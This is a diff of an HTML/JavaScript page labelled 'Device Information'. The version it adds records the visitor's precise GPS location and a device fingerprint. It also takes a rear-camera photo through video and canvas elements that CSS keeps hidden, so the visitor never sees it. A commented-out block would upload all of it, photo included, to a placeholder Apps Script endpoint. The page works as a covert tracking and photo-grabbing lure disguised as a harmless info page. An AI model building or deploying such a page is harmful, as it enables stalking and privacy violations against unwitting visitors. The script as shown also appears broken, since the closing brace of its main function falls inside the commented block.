@@ -1,330 +1,256 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Device Information</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        max-width: 700px;
+        margin: 30px auto;
+        padding: 20px;
+      }
 
-<title>Device Information</title>
+      button {
+        padding: 12px 20px;
+        font-size: 16px;
+        cursor: pointer;
+      }
 
-<style>
-body {
-    font-family: Arial, sans-serif;
-    max-width: 700px;
-    margin: 30px auto;
-    padding: 20px;
-}
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 20px;
+      }
 
-button {
-    padding: 12px 20px;
-    font-size: 16px;
-    cursor: pointer;
-}
+      td {
+        border: 1px solid #ddd;
+        padding: 8px;
+      }
 
-table {
-    width: 100%;
-    border-collapse: collapse;
-    margin-top: 20px;
-}
+      td:first-child {
+        font-weight: bold;
+        width: 35%;
+      }
 
-td {
-    border: 1px solid #ddd;
-    padding: 8px;
-}
+      #status {
+        margin-top: 15px;
+        font-weight: bold;
+      }
 
-td:first-child {
-    font-weight: bold;
-    width: 35%;
-}
+      /* Camera is never displayed */
+      #camera,
+      #canvas {
+        display: none;
+      }
+    </style>
+  </head>
 
-#status {
-    margin-top: 15px;
-    font-weight: bold;
-}
-</style>
-</head>
-
-<body>
-
-<h2>Device Information</h2>
-
-<p>
-This page requests your location permission and displays the information
-your browser makes available.
-</p>
-
-<button onclick="startTracker()">
-    Allow Location & Continue
-</button>
-
-<div id="status"></div>
-
-<table id="result"></table>
-
-<script>
-
-const API_URL = "YOUR_APPS_SCRIPT_URL";
-
-
-function getOS() {
-
-    const ua = navigator.userAgent;
-
-    if (/Windows/i.test(ua))
-        return "Windows";
-
-    if (/Android/i.test(ua))
-        return "Android";
-
-    if (/iPhone|iPad|iPod/i.test(ua))
-        return "iOS";
-
-    if (/Mac/i.test(ua))
-        return "macOS";
-
-    if (/Linux/i.test(ua))
-        return "Linux";
-
-    return "Unknown";
-}
-
-
-function getBrowser() {
-
-    const ua = navigator.userAgent;
-
-    if (/Edg/i.test(ua))
-        return "Microsoft Edge";
-
-    if (/Chrome/i.test(ua) && !/Edg/i.test(ua))
-        return "Google Chrome";
-
-    if (/Firefox/i.test(ua))
-        return "Firefox";
-
-    if (/Safari/i.test(ua) && !/Chrome/i.test(ua))
-        return "Safari";
-
-    return "Unknown";
-}
-
-
-async function getBattery() {
-
-    if (!navigator.getBattery)
-        return {
-            battery: "Unavailable",
-            charging: "Unavailable"
-        };
-
-    try {
-
-        const b = await navigator.getBattery();
-
-        return {
+  <body>
+    <h2>Device Information</h2>
+    <p>Press the button to allow location and camera access.</p>
+    <button id="startButton" onclick="startTracker()">
+      Allow Location & Continue
+    </button>
+    <div id="status"></div>
+    <table id="result"></table>
+    <!-- Hidden camera -->
+    <video id="camera" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <script>
+      const API_URL = "YOUR_APPS_SCRIPT_URL";
+      /* ========================= OS ========================= */
+      function getOS() {
+        const ua = navigator.userAgent;
+        if (/Windows/i.test(ua)) return "Windows";
+        if (/Android/i.test(ua)) return "Android";
+        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+        if (/Mac/i.test(ua)) return "macOS";
+        if (/Linux/i.test(ua)) return "Linux";
+        return "Unknown";
+      }
+      /* ========================= BROWSER ========================= */
+      function getBrowser() {
+        const ua = navigator.userAgent;
+        if (/Edg/i.test(ua)) return "Microsoft Edge";
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return "Google Chrome";
+        if (/Firefox/i.test(ua)) return "Firefox";
+        if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
+        return "Unknown";
+      }
+      /* ========================= BATTERY ========================= */
+      async function getBattery() {
+        if (!navigator.getBattery) {
+          return { battery: "Unavailable", charging: "Unavailable" };
+        }
+        try {
+          const b = await navigator.getBattery();
+          return {
             battery: Math.round(b.level * 100) + "%",
-            charging: b.charging ? "Yes" : "No"
-        };
-
-    } catch (e) {
-
-        return {
-            battery: "Unavailable",
-            charging: "Unavailable"
-        };
-    }
-}
-
-
-function show(key, value) {
-
-    const table = document.getElementById("result");
-
-    const row = document.createElement("tr");
-
-    const k = document.createElement("td");
-    k.textContent = key;
-
-    const v = document.createElement("td");
-    v.textContent = value;
-
-    row.appendChild(k);
-    row.appendChild(v);
-
-    table.appendChild(row);
-}
-
-
-async function startTracker() {
-
-    const status = document.getElementById("status");
-
-    status.textContent = "Collecting information...";
-
-    document.getElementById("result").innerHTML = "";
-
-    const batteryInfo = await getBattery();
-
-    const data = {
-
-        latitude: "",
-        longitude: "",
-        accuracy: "",
-        altitude: "",
-        speed: "",
-        heading: "",
-
-        battery: batteryInfo.battery,
-        charging: batteryInfo.charging,
-
-        os: getOS(),
-        browser: getBrowser(),
-
-        screen:
-            screen.width +
-            " × " +
-            screen.height,
-
-        language: navigator.language,
-
-        timezone:
-            Intl.DateTimeFormat()
-                .resolvedOptions()
-                .timeZone,
-
-        cpuCores:
-            navigator.hardwareConcurrency || "Unavailable",
-
-        ram:
-            navigator.deviceMemory
+            charging: b.charging ? "Yes" : "No",
+          };
+        } catch (e) {
+          return { battery: "Unavailable", charging: "Unavailable" };
+        }
+      }
+      /* ========================= LOCATION ========================= */
+      function getLocation() {
+        return new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("Geolocation unavailable"));
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0,
+          });
+        });
+      }
+      /* ========================= PHOTO Rear camera ========================= */
+      async function capturePhoto() {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: "environment" } },
+          audio: false,
+        });
+        const video = document.getElementById("camera");
+        const canvas = document.getElementById("canvas");
+        video.srcObject = stream;
+        /* * Give the camera a moment to provide * its actual dimensions. */ await new Promise(
+          (resolve) => {
+            if (video.readyState >= 2) {
+              resolve();
+            } else {
+              video.onloadedmetadata = () => resolve();
+            }
+          },
+        );
+        await video.play();
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photo = canvas.toDataURL("image/jpeg", 0.75);
+        /* Stop camera immediately */ stream
+          .getTracks()
+          .forEach((track) => track.stop());
+        video.srcObject = null;
+        return photo;
+      }
+      /* ========================= TABLE ========================= */
+      function show(key, value) {
+        const table = document.getElementById("result");
+        const row = document.createElement("tr");
+        const k = document.createElement("td");
+        const v = document.createElement("td");
+        k.textContent = key;
+        v.textContent =
+          value !== undefined && value !== null && value !== ""
+            ? value
+            : "Unavailable";
+        row.appendChild(k);
+        row.appendChild(v);
+        table.appendChild(row);
+      }
+      /* ========================= MAIN ========================= */ async function startTracker() {
+        const button = document.getElementById("startButton");
+        const status = document.getElementById("status");
+        button.disabled = true;
+        status.textContent = "Collecting information...";
+        document.getElementById("result").innerHTML = "";
+        /* ========================= DEVICE DATA ========================= */ const batteryInfo =
+          await getBattery();
+        const data = {
+          timestamp: new Date().toISOString(),
+          latitude: "",
+          longitude: "",
+          accuracy: "",
+          altitude: "",
+          speed: "",
+          heading: "",
+          battery: batteryInfo.battery,
+          charging: batteryInfo.charging,
+          os: getOS(),
+          browser: getBrowser(),
+          screen: screen.width + " × " + screen.height,
+          availableScreen: screen.availWidth + " × " + screen.availHeight,
+          viewport: window.innerWidth + " × " + window.innerHeight,
+          pixelRatio: window.devicePixelRatio,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          cpuCores: navigator.hardwareConcurrency || "Unavailable",
+          ram: navigator.deviceMemory
             ? navigator.deviceMemory + " GB"
             : "Unavailable",
-
-        touch:
-            navigator.maxTouchPoints > 0
-            ? "Yes"
-            : "No",
-
-        online:
-            navigator.onLine
-            ? "Yes"
-            : "No"
-    };
-
-
-    function processLocation(position) {
-
-        const c = position.coords;
-
-        data.latitude = c.latitude;
-        data.longitude = c.longitude;
-        data.accuracy = c.accuracy + " m";
-
-        data.altitude =
-            c.altitude !== null
-            ? c.altitude + " m"
-            : "Unavailable";
-
-        data.speed =
-            c.speed !== null
-            ? c.speed + " m/s"
-            : "Unavailable";
-
-        data.heading =
-            c.heading !== null
-            ? c.heading + "°"
-            : "Unavailable";
-
-        displayAndSend(data);
-    }
-
-
-    function locationError(error) {
-
-        status.textContent =
-            "Location permission was not granted. Other information will still be collected.";
-
-        displayAndSend(data);
-    }
-
-
-    if (!navigator.geolocation) {
-
-        displayAndSend(data);
-
-    } else {
-
-        navigator.geolocation.getCurrentPosition(
-            processLocation,
-            locationError,
-            {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            }
+          touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
+          online: navigator.onLine ? "Yes" : "No",
+          userAgent: navigator.userAgent,
+        };
+        /* ========================= LOCATION ========================= */ status.textContent =
+          "Requesting location permission...";
+        try {
+          const position = await getLocation();
+          const c = position.coords;
+          data.latitude = c.latitude;
+          data.longitude = c.longitude;
+          data.accuracy = c.accuracy;
+          data.altitude = c.altitude;
+          data.speed = c.speed;
+          data.heading = c.heading;
+        } catch (error) {
+          console.log("Location error:", error);
+        }
+        /* ========================= CAMERA ========================= */ status.textContent =
+          "Requesting camera permission...";
+        try {
+          data.photo = await capturePhoto();
+        } catch (error) {
+          console.log("Camera error:", error);
+          data.photo = null;
+        }
+        /* ========================= DISPLAY ========================= */ show(
+          "Latitude",
+          data.latitude,
         );
-    }
-}
-
-
-function displayAndSend(data) {
-
-    document.getElementById("status").textContent =
-        "Information collected.";
-
-    show("Latitude", data.latitude || "Unavailable");
-    show("Longitude", data.longitude || "Unavailable");
-    show("Accuracy", data.accuracy || "Unavailable");
-    show("Altitude", data.altitude || "Unavailable");
-    show("Speed", data.speed || "Unavailable");
-    show("Heading", data.heading || "Unavailable");
-
-    show("Battery", data.battery);
-    show("Charging", data.charging);
-
-    show("Operating System", data.os);
-    show("Browser", data.browser);
-
-    show("Screen", data.screen);
-    show("Language", data.language);
-    show("Timezone", data.timezone);
-
-    show("CPU Cores", data.cpuCores);
-    show("RAM", data.ram);
-    show("Touch Screen", data.touch);
-    show("Online", data.online);
-
-
-    // fetch(API_URL, {
-
-    //     method: "POST",
-
-    //     headers: {
-    //         "Content-Type": "text/plain;charset=utf-8"
-    //     },
-
-    //     body: JSON.stringify(data)
-
-    // })
-    // .then(response => response.text())
-
-    // .then(result => {
-
-    //     document.getElementById("status").textContent =
-    //         "Information collected and saved.";
-
-    // })
-
-    // .catch(error => {
-
-    //     document.getElementById("status").textContent =
-    //         "Information collected, but could not be saved.";
-
-    //     console.error(error);
-
-    // });
-}
-
-</script>
-
-</body>
+        show("Longitude", data.longitude);
+        show("GPS Accuracy", data.accuracy);
+        show("Altitude", data.altitude);
+        show("Speed", data.speed);
+        show("Heading", data.heading);
+        show("Battery", data.battery);
+        show("Charging", data.charging);
+        show("Operating System", data.os);
+        show("Browser", data.browser);
+        show("Screen", data.screen);
+        show("Language", data.language);
+        show("Timezone", data.timezone);
+        show("CPU Cores", data.cpuCores);
+        show("RAM", data.ram);
+        show("Touch Screen", data.touch);
+        show("Online", data.online);
+        /* ========================= SEND EVERYTHING ========================= */ 
+        
+        
+      //   status.textContent =
+      //     "Uploading information...";
+      //   try {
+      //     const response = await fetch(API_URL, {
+      //       method: "POST",
+      //       headers: { "Content-Type": "text/plain;charset=utf-8" },
+      //       body: JSON.stringify(data),
+      //     });
+      //     const result = await response.json();
+      //     if (result.success) {
+      //       status.textContent = "Information and photo saved successfully.";
+      //     } else {
+      //       status.textContent = "Information collected, but upload failed.";
+      //     }
+      //   } catch (error) {
+      //     console.error(error);
+      //     status.textContent = "Information collected, but upload failed.";
+      //   }
+      // }
+    </script>
+  </body>
 </html>
